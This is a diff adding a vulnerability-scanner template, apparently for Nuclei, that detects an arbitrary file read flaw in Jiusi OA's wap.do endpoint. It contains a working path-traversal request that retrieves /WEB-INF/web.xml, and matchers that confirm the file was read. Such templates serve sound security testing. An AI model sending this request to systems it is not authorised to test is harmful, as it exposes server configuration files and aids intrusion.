@@ -1,0 +1,32 @@
+id: jiusi-oa-arbitrary-file-read
+
+info:
+  name: Jiusi OA wap.do Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jiusi OA system suffers from an arbitrary file read vulnerability in the wap.do endpoint. This allows attackers to obtain sensitive server information, such as configuration files.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /jsoa/wap.do?method=downLoad HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        path=../&name=&FileName=/WEB-INF/web.xml
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "UrlRewriteFilter"
+          - "</servlet-name>"
+        part: body
